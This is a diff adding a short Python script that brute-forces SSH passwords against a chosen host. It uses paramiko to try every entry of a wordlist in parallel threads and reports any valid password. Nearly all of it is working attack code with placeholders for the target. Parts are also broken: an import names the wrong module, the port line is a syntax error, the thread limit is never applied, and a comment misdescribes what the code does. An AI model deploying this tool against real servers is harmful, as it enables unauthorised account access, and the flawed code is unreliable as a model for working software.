@@ -1,0 +1,40 @@
+from pwntools import *
+import paramiko
+import threading
+
+host = "" #Enter the host IP address
+port =  # Enter the port number (without the double quotes)
+username = "" #Enter the Username 
+max_threads = 5  # Number of threads to run concurrently
+
+def brute_force(password):
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        client.connect(host, port=port, username=username, password=password, timeout=5)
+        
+        print(f"[>] Valid password found: '{password}'!")
+        
+        client.close()
+        
+        # Exit all threads when a valid password is found
+        for thread in threading.enumerate():
+            if thread != threading.current_thread():
+                thread.join()
+        
+    except paramiko.ssh_exception.AuthenticationException:
+        print("[X] Invalid Password !")
+
+with open("[enter the path to the password list here ]", "r") as pass_list:
+    passwords = pass_list.read().splitlines()
+
+    threads = []
+    for password in passwords:
+        thread = threading.Thread(target=brute_force, args=(password,))
+        threads.append(thread)
+        thread.start()
+
+    # Wait for all threads to finish
+    for thread in threads:
+        thread.join()
